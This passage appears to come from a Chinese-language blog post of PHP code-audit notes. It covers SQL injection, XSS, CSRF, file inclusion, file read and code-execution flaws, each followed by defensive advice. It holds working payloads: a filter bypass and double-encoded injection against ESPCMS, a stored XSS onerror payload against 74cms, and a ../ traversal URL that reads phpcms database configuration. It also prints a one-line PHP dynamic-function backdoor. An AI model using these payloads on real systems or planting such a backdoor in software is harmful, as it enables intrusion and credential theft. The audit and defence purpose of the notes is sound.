array(&apos;article&apos;, &apos;forum&apos;, &apos;search&apos;, &apos;bbssearch&apos;, &apos;forummain&apos;, &apos;messmain&apos;, &apos;special&apos;, &apos;respond&apos;, &apos;public&apos;, &apos;scriptout&apos;, &apos;enquiry&apos;, &apos;enquirymain&apos;, &apos;form&apos;, &apos;formmain&apos;, &apos;ordermain&apos;, &apos;membermain&apos;, &apos;member&apos;, &apos;forum&apos;, &apos;order&apos;))) &#123;</div><div class="line">		$action = &apos;in_&apos; . $action;</div><div class="line">		if (!file_exists(admin_ROOT . &quot;interface/$archive.php&quot;)) &#123;</div><div class="line">			exit(&apos;Access error!&apos;);</div><div class="line">		&#125;</div><div class="line">		include admin_ROOT . &quot;interface/$archive.php&quot;;</div><div class="line">		$mainlist = new mainpage();</div><div class="line">		if (method_exists($mainlist, $action)) &#123;</div><div class="line">			$mainlist-&gt;$action();</div><div class="line">		&#125; else &#123;</div><div class="line">			exit(&apos;Access error!&apos;);</div><div class="line">		&#125;</div><div class="line">	&#125; else &#123;</div><div class="line">		exit(&apos;Access error!&apos;);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在以上代码中可以知道，使archive=serach,action=taglist,就可以跳到interface/search目录中的in_taglist函数。再给tagkey赋上一个值即可。<br>最终完成url回溯，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=a</div></pre></td></tr></table></figure></p>
<p>根据二次urldecode注入原理，构造url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=a%2527</div></pre></td></tr></table></figure></p>
<p>espcms本身有防注入函数，在文件<br>publicclass_function.php inputcodetrim()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">function inputcodetrim($str) &#123;</div><div class="line">	if (empty($str)) return $str;</div><div class="line">	$str = str_replace(&quot;&amp;amp;&quot;, &quot;&amp;&quot;, $str);</div><div class="line">	$str = str_replace(&quot;&amp;gt;&quot;, &quot;&gt;&quot;, $str);</div><div class="line">	$str = str_replace(&quot;&amp;lt;&quot;, &quot;&lt;&quot;, $str);</div><div class="line">	$str = str_replace(&quot;&amp;lt;&quot;, &quot;&lt;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;select&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;join&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;union&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;where&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;insert&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;delete&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;update&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;like&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;drop&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;create&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;modify&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;rename&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;count&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;from&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;group by&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;concat&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;alter&quot;, &quot;&quot;, $str);</div><div class="line">	$str = str_ireplace(&quot;ca&amp;#115;&quot;, &quot;cast&quot;, $str);</div><div class="line">	$str = preg_replace(&quot;/&lt;span[^&gt;]+&gt;/i&quot;, &quot;&lt;span&gt;&quot;, $str);</div><div class="line">	$str = preg_replace(&quot;/&lt;p[^&gt;]+&gt;/i&quot;, &quot;&lt;p&gt;&quot;, $str);</div><div class="line">	$str = preg_replace(&quot;/&lt;font[^&gt;]+&gt;/i&quot;, &quot;&lt;font&gt;&quot;, $str);</div><div class="line">	$str = preg_replace(&quot;/width=(\&apos;|\&quot;)?[\d%]+(\&apos;|\&quot;)?/i&quot;, &quot;&quot;, $str);</div><div class="line">	$str = preg_replace(&quot;/height=(\&apos;|\&quot;)?[\d%]+(\&apos;|\&quot;)?/i&quot;, &quot;&quot;, $str);</div><div class="line">	$str = preg_replace(&quot;&apos;&lt;style[^\f]*?(\/style&gt;)&apos;si&quot;, &quot;&quot;, $str);</div><div class="line">	return $str;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>关键字替换为空，可以利用seselectlect=select绕过。</p>
<h3 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h3><h4 id="gpc-retime魔术引号"><a href="#gpc-retime魔术引号" class="headerlink" title="gpc/retime魔术引号"></a>gpc/retime魔术引号</h4><ul>
<li>magic_quotes_gpc对GET、POST、COOKIE的值进行过滤</li>
<li>magic_quotes_runtime对数据库或文件中获取的数据进行过滤</li>
</ul>
<h4 id="过滤函数和类"><a href="#过滤函数和类" class="headerlink" title="过滤函数和类"></a>过滤函数和类</h4><ul>
<li>addslashes()函数，在程序入口使用</li>
<li>mysql<em>[real</em>]escape_string函数</li>
<li>intval等字符转换，将变量转换成int类型</li>
<li>PDO prepare预编译</li>
</ul>
<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><ul>
<li>反射型XSS：通过外部输入然后直接在浏览器端触发</li>
<li>存储型XSS：先把利用代码保存在数据库或文件中，当Web程序读取利用代码并输出在页面上时触发漏洞</li>
</ul>
<h3 id="挖掘经验-1"><a href="#挖掘经验-1" class="headerlink" title="挖掘经验"></a>挖掘经验</h3><p>寻找常见的输出函数列表如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">print</div><div class="line">print_r</div><div class="line">echo</div><div class="line">printf</div><div class="line">sprintf</div><div class="line">die</div><div class="line">var_dump</div><div class="line">var_export</div></pre></td></tr></table></figure></p>
<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><h4 id="骑士cms存储型XSS分析"><a href="#骑士cms存储型XSS分析" class="headerlink" title="骑士cms存储型XSS分析"></a>骑士cms存储型XSS分析</h4><p>在/admin/admin_link.php可以看到代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">$act = !empty($_GET[&apos;act&apos;]) ? trim($_GET[&apos;act&apos;]) : &apos;list&apos;;</div><div class="line">$smarty-&gt;assign(&apos;pageheader&apos;,&quot;友情链接&quot;);</div><div class="line">if($act == &apos;list&apos;)</div><div class="line">&#123;</div><div class="line">	get_token();</div><div class="line">	check_permissions($_SESSION[&apos;admin_purview&apos;],&quot;link_show&quot;);</div><div class="line">	require_once(QISHI_ROOT_PATH.&apos;include/page.class.php&apos;);</div><div class="line">	$oederbysql=&quot; order BY l.show_order DESC&quot;;</div><div class="line">	$key=isset($_GET[&apos;key&apos;])?trim($_GET[&apos;key&apos;]):&quot;&quot;;</div><div class="line">	$key_type=isset($_GET[&apos;key_type&apos;])?intval($_GET[&apos;key_type&apos;]):&quot;&quot;;</div><div class="line">	if ($key &amp;&amp; $key_type&gt;0)</div><div class="line">	&#123;</div><div class="line">		</div><div class="line">		if     ($key_type===1)$wheresql=&quot; WHERE l.link_name like &apos;%&#123;$key&#125;%&apos;&quot;;</div><div class="line">		elseif ($key_type===2)$wheresql=&quot; WHERE l.link_url like &apos;%&#123;$key&#125;%&apos;&quot;;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">	!empty($_GET[&apos;alias&apos;])? $wheresqlarr[&apos;l.alias&apos;]=trim($_GET[&apos;alias&apos;]):&apos;&apos;;</div><div class="line">	!empty($_GET[&apos;type_id&apos;])? $wheresqlarr[&apos;l.type_id&apos;]=intval($_GET[&apos;type_id&apos;]):&apos;&apos;;</div><div class="line">	if (is_array($wheresqlarr)) $wheresql=wheresql($wheresqlarr);</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	$joinsql=&quot; LEFT JOIN &quot;.table(&apos;link_category&apos;).&quot; AS c ON l.alias=c.c_alias  &quot;;</div><div class="line">	$total_sql=&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;link&apos;).&quot; AS l &quot;.$joinsql.$wheresql;</div><div class="line">	$page = new page(array(&apos;total&apos;=&gt;$db-&gt;get_total($total_sql), &apos;perpage&apos;=&gt;$perpage));</div><div class="line">	$currenpage=$page-&gt;nowindex;</div><div class="line">	$offset=($currenpage-1)*$perpage;</div><div class="line">	$link = get_links($offset, $perpage,$joinsql.$wheresql.$oederbysql);</div><div class="line">	$smarty-&gt;assign(&apos;link&apos;,$link);</div><div class="line">	$smarty-&gt;assign(&apos;page&apos;,$page-&gt;show(3));</div><div class="line">	$smarty-&gt;assign(&apos;upfiles_dir&apos;,$upfiles_dir);</div><div class="line">	$smarty-&gt;assign(&apos;get_link_category&apos;,get_link_category());</div><div class="line">	$smarty-&gt;assign(&apos;navlabel&apos;,&quot;list&quot;);</div><div class="line">	$smarty-&gt;display(&apos;link/admin_link.htm&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先对act进行判断，如果act不存在就给其赋值list<br>然后对数据库中已存在的申请链接数据利用smarty模版引擎输出，其中get_links()进行链接的读取<br>定位get_links()函数到admin\admin_link.php中的get_links()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function get_links($offset, $perpage, $get_sql= &apos;&apos;)</div><div class="line">&#123;</div><div class="line">	global $db;</div><div class="line">	$row_arr = array();</div><div class="line">	$limit=&quot; LIMIT &quot;.$offset.&apos;,&apos;.$perpage;</div><div class="line">	$result = $db-&gt;query(&quot;SELECT l.*,c.categoryname FROM &quot;.table(&apos;link&apos;).&quot; AS l &quot;.$get_sql.$limit);</div><div class="line">	while($row = $db-&gt;fetch_array($result))</div><div class="line">	&#123;</div><div class="line">	$row_arr[] = $row;</div><div class="line">	&#125;</div><div class="line">	return $row_arr;	</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从数据库中读取友情链接列表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$link = get_links($offset, $perpage,$joinsql.$wheresql.$oederbysql);</div></pre></td></tr></table></figure></p>
<p>利用smarty模版引擎将读出的内容以link/admin_link.htm显示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$smarty-&gt;display(&apos;link/admin_link.htm&apos;);</div></pre></td></tr></table></figure></p>
<p>跟进模版页面，关键代码段如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"> &#123;#if $list.Notes&lt;&gt;&quot;&quot;#&#125;</div><div class="line">&lt;img src=&quot;images/comment_alert.gif&quot; border=&quot;0&quot;  class=&quot;vtip&quot; title=&quot;&#123;#$list.Notes#&#125;&quot; /&gt;</div><div class="line">&#123;#/if#&#125;</div><div class="line"> &#123;#if $list.link_logo&lt;&gt;&quot;&quot;#&#125;</div><div class="line">&lt;span style=&quot;color:#FF6600&quot; title=&quot;&lt;img src=&#123;#$list.link_logo#&#125; border=0/&gt;&quot; class=&quot;vtip&quot;&gt;[logo]&lt;/span&gt;</div><div class="line">&#123;#/if#&#125;</div><div class="line">&#123;#if $list.display&lt;&gt;&quot;1&quot;#&#125;</div><div class="line">&lt;span style=&quot;color: #999999&quot;&gt;[不显示]&lt;/span&gt;</div></pre></td></tr></table></figure></p>
<p>其中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;span style=&quot;color:#FF6600&quot; title=&quot;&lt;img src=&#123;#$list.link_logo#&#125; border=0/&gt;&quot; class=&quot;vtip&quot;&gt;[logo]&lt;/span&gt;</div></pre></td></tr></table></figure></p>
<p>问题是直接把显示logo的img标签放在span标签的title里面，当鼠标滑过的时候会调用事件执行显示title即执行img标签，利用点是｛#$list.link_logo#｝可以是HTML实体编码，从而绕过74cms的安全检查。</p>
<p>来构造代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;span class=&quot;vtip&quot; title=&quot;&amp;lt;img src=1 onerror=alert(1) border=0/&amp;gt;&quot; style=&quot;color: rgb(255, 102, 0);&quot;&gt;[logo]&lt;/span&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/74cms6.png" alt=""></p>
<p>管理员后台鼠标滑过Logo就能触发XSS<br><img src="http://obr4sfdq7.bkt.clouddn.com/74cms7.png" alt=""></p>
<h3 id="漏洞防范-1"><a href="#漏洞防范-1" class="headerlink" title="漏洞防范"></a>漏洞防范</h3><h4 id="特殊字符HTML实体转码"><a href="#特殊字符HTML实体转码" class="headerlink" title="特殊字符HTML实体转码"></a>特殊字符HTML实体转码</h4><p>过滤相关的特殊字符，特殊字符列表如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">单引号（&apos;）</div><div class="line">双引号（&quot;）</div><div class="line">尖括号（&lt;&gt;）</div><div class="line">反斜杠（\）</div><div class="line">冒号（:）</div><div class="line">and符（&amp;）</div><div class="line">#号（#）</div></pre></td></tr></table></figure></p>
<p>在输出和而此次调用的时候进行如HTML实体一类的转码</p>
<h4 id="标签事件属性黑白名单"><a href="#标签事件属性黑白名单" class="headerlink" title="标签事件属性黑白名单"></a>标签事件属性黑白名单</h4><p>用正则表达式匹配标签事件实现规则</p>
<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><p>跨站请求伪造，劫持其他用户去进行一些请求</p>
<h3 id="挖掘经验-2"><a href="#挖掘经验-2" class="headerlink" title="挖掘经验"></a>挖掘经验</h3><p>CSRF主要是用于越权操作，所有漏洞在有权限控制的地方，像管理后台、会员中心、论坛帖子以及交易管理等。<br>黑盒测试时，在以上几处打开非静态操作的页面，抓包查看有没有token，如果没有token的话，再直接请求这个页面，不带referer。如果返回的数据还是一样的，说明可能存在CSRFL漏洞。<br>白盒测试时，看核心文件里面是否验证token和referer相关的代码。</p>
<h3 id="漏洞防范-2"><a href="#漏洞防范-2" class="headerlink" title="漏洞防范"></a>漏洞防范</h3><ul>
<li>增加token/referer验证避免img标签请求的水坑攻击</li>
<li>增加验证码</li>
</ul>
<h4 id="Token验证"><a href="#Token验证" class="headerlink" title="Token验证"></a>Token验证</h4><p>Token在计算机认证领域叫令牌，在页面或者Coolie里面加一个不可预测的字符串，服务器在接收操作请求的时候只要验证下这个字符串是不是上次访问留下来的即可判断是不是可信请求，因为如果没有访问上一个页面，是无法得到这个Token的，除非XSS漏洞或者其他手段能获得通信数据。</p>
<h1 id="漏洞挖掘与防范（进阶篇）"><a href="#漏洞挖掘与防范（进阶篇）" class="headerlink" title="漏洞挖掘与防范（进阶篇）"></a>漏洞挖掘与防范（进阶篇）</h1><h2 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h2><p>文件操作包括文件包含、文件读取、文件删除、文件修改以及文件上传。</p>
<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>PHP的文件包含可以直接执行包含文件的代码，包含的文件的格式是不受限制的，只要能正常执行即可，文件包含分为本地文件包含和远程文件包含。<br>文件包含函数有include()、include_once()、require()和require_once()，它们之间的区别在于：include()和include_once()在包含文件时即使遇到错误，下面的代码依然会继续执行；而require()和require_once()则会直接报错退出程序。</p>
<h4 id="挖掘经验-3"><a href="#挖掘经验-3" class="headerlink" title="挖掘经验"></a>挖掘经验</h4><p>文件包含漏洞大多出现在模块加载、模版加载以及cache调用的地方。直接搜索include()、include_once()、require()和require_once()这四个函数来回溯是否有可控的变量。</p>
<ul>
<li>本地文件包含是指只能包含本机文件的文件包含漏洞。</li>
</ul>
<p>测试代码1.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">define(&quot;ROOT&quot;,dirname(__FILE__).&apos;/&apos;);</div><div class="line">$mod = $_GET[&apos;mod&apos;];</div><div class="line">echo ROOT.$mod.&apos;.php&apos;;</div><div class="line">include(ROOT.$mod.&apos;.php&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>2.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php phpinfo();?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/LPI.png" alt=""></p>
<ul>
<li>远程文件包含是指可以包含远程文件的包含漏洞，远程文件包含需要设置allow_url_include=On,函数支持HTTP、FTP等协议。</li>
</ul>
<h3 id="文件读取（下载）漏洞"><a href="#文件读取（下载）漏洞" class="headerlink" title="文件读取（下载）漏洞"></a>文件读取（下载）漏洞</h3><h4 id="挖掘经验-4"><a href="#挖掘经验-4" class="headerlink" title="挖掘经验"></a>挖掘经验</h4><p>文件读取函数列表如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_get_contents()、highlight_file()、fopen()、readfile()、fread()、fgetss()、fgets()、parse_ini_file()、show_source()、file()</div></pre></td></tr></table></figure></p>
<h4 id="phpcms任意文件读取分析"><a href="#phpcms任意文件读取分析" class="headerlink" title="phpcms任意文件读取分析"></a>phpcms任意文件读取分析</h4><p>漏洞位于文件/phpcms/modules/search/index.php中的get_suggest_keyword函数，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">public function public_get_suggest_keyword() &#123;</div><div class="line">	$url = $_GET[&apos;url&apos;].&apos;&amp;q=&apos;.$_GET[&apos;q&apos;];</div><div class="line">	</div><div class="line">	$res = @file_get_contents($url);</div><div class="line">	if(CHARSET != &apos;gbk&apos;) &#123;</div><div class="line">		$res = iconv(&apos;gbk&apos;, CHARSET, $res);</div><div class="line">	&#125;</div><div class="line">	echo $res;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>从GET参数中获取要读取的URL，然后使用file_get_contents函数来读取内容，在目录前，需要加../来跳目录。</p>
<p>EXP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=1&amp;q=../../phpsso_server/caches/configs/database.php</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/phpcms.png" alt=""></p>
<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="挖掘经验-5"><a href="#挖掘经验-5" class="headerlink" title="挖掘经验"></a>挖掘经验</h4><p>搜索上传函数move_uploaded_file()</p>
<h4 id="未做过滤或本地过滤"><a href="#未做过滤或本地过滤" class="headerlink" title="未做过滤或本地过滤"></a>未做过滤或本地过滤</h4><p>未过滤和本地过滤共同点都是在服务器端未做过滤</p>
<h4 id="黑（白）名单扩展名过滤"><a href="#黑（白）名单扩展名过滤" class="headerlink" title="黑（白）名单扩展名过滤"></a>黑（白）名单扩展名过滤</h4><p>黑名单缺点：</p>
<ul>
<li>限制的扩展名不够全，如敝在IIS下执行ASP的代码不止.asp这个扩展名，还有cdx,asa,cer等。</li>
<li>验证扩展名的方式存在问题可以直接绕过，另外是结合PHP和系统的特点，导致可以截断文件名来绕过黑名单限制。</li>
</ul>
<h4 id="文件头、content-type验证绕过"><a href="#文件头、content-type验证绕过" class="headerlink" title="文件头、content-type验证绕过"></a>文件头、content-type验证绕过</h4><h3 id="文件删除漏洞"><a href="#文件删除漏洞" class="headerlink" title="文件删除漏洞"></a>文件删除漏洞</h3><p>常出现这个漏洞的函数是unlink()，不过老版本下session_destroy()函数也可以删除文件。一般也是因为删除的文件名可以用../跳转，或者没有限制当前用户只能删除他该有权限删除的文件。</p>
<h4 id="挖掘经验-6"><a href="#挖掘经验-6" class="headerlink" title="挖掘经验"></a>挖掘经验</h4><p>可以搜索带有变量参数的unlink()。</p>
<h3 id="文件操作漏洞防范"><a href="#文件操作漏洞防范" class="headerlink" title="文件操作漏洞防范"></a>文件操作漏洞防范</h3><h4 id="通用文件操作防御"><a href="#通用文件操作防御" class="headerlink" title="通用文件操作防御"></a>通用文件操作防御</h4><ul>
<li>由越权操作引起可以操作未授权操作的文件</li>
<li>要操作更多文件需要跳转目录</li>
<li>大多都是直接在请求传入文件名</li>
</ul>
<h4 id="文件上传漏洞防范"><a href="#文件上传漏洞防范" class="headerlink" title="文件上传漏洞防范"></a>文件上传漏洞防范</h4><ul>
<li>白名单方式过滤文件扩展名，使用in_array或者三等于（===）来对比扩展名</li>
<li>保存上传的文件时重命名文件，文件命名规则采用时间戳的拼接随机数的MD5值方式“md5(time()+rand(1,10000))”。</li>
</ul>
<h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><p>该漏洞主要由eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()、array_map()等函数的参数过滤不严格导致，另外还有PHP的动态函数($a($b))也是目前出现比较多的。</p>
<h3 id="挖掘经验-7"><a href="#挖掘经验-7" class="headerlink" title="挖掘经验"></a>挖掘经验</h3><p>eval()和assert()函数导致的代码执行漏洞大多是因为载入缓存或者模版以及对变量的处理不严格导致。<br>preg_replace()函数的代码执行需要存在/e参数。<br>call_user_func()和call_user_func_array()函数的功能是调用函数，多用在框架里面动态调用函数。</p>
<h4 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h4><ul>
<li>eval和assert函数<br>这两个函数用来动态啊执行代码。<br>测试代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a=&apos;aaa&apos;;</div><div class="line">$b=&apos;bbb&apos;;</div><div class="line">eval(&apos;$a=$b&apos;);</div><div class="line">var_dump($a);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/eval.png" alt=""></p>
<ul>
<li>preg_replace函数<br>preg_replace函数的作用是对字符串进行正则处理。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</div></pre></td></tr></table></figure>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
<td style="text-align:center">正则表达式</td>
</tr>
<tr>
<td>replacement</td>
<td style="text-align:center">替换的内容</td>
</tr>
<tr>
<td>subject</td>
<td style="text-align:center">需要匹配替换的对象</td>
</tr>
<tr>
<td>limit</td>
<td style="text-align:center">可选，指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换</td>
</tr>
</tbody>
</table>
<p>当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作 PHP代码执行，那么，针对此种情况，当replacement内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p>
<p>1.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">preg_replace(&quot;/\[(.*)\]/e&quot;, &apos;\\1&apos;, $_GET[&apos;str&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>正则表达的意思是从$_GET[‘str’]变量里搜索中括号[]中间的内容作为第一组的结果，preg_replace()函数第二个参数为‘\1’代表这里用第一组结果填充，请求str=[phpinfo()]，则执行代码phpinfo().</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/preg_replace.png" alt=""></p>
<ul>
<li>调用函数过滤不严<br>call_user_func()和array_map()等数个函数有调用其他函数的功能，其中的一个参数作为要调用的函数名，那如果这个传入的函数名可控，那就可以调用函数来执行代码。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">call_user_func()</div><div class="line">mixed call_user_func(callable $callback [,mixed $parameter [,mixed $..]])</div></pre></td></tr></table></figure>
</li>
</ul>
<p>该函数第一个参数作为回调函数，后面的参数为回调函数的参数，测试代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$b=&quot;phpinfo()&quot;;</div><div class="line">call_user_func($_GET[&apos;a&apos;],$b);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>请求1.php?a=assert的时候，则调用了assert函数，并且将phpinfo作为参数传入。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/call_user_func.png" alt=""></p>
<ul>
<li>动态函数执行<br>由于PHP的特性，PHP的函数可以直接由字符串拼接。<br>PHP动态参数写法为“变量（参数）”，常见动态函数后门如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/_GET.png" alt=""></p>
<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>PHP的命令执行漏洞主要基于一些函数的参数过滤不严导致，可以执行命令的函数有system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()一共七个函数，另外反引号（`）也可以命令执行，不过实际上这种也是调用的shell_exec()函数。</p>
<h3 id="挖掘经验-8"><a href="#挖掘经验-8" class="headerlink" title="挖掘经验"></a>挖掘经验</h3><p>搜索命令执行函数system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()</p>
<h4 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h4><p>system()、exec()、shell_exec()、passthru()以及反引号（`）可以直接传入命令并且函数返回执行结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">system(&apos;whoami&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/system.png" alt=""></p>
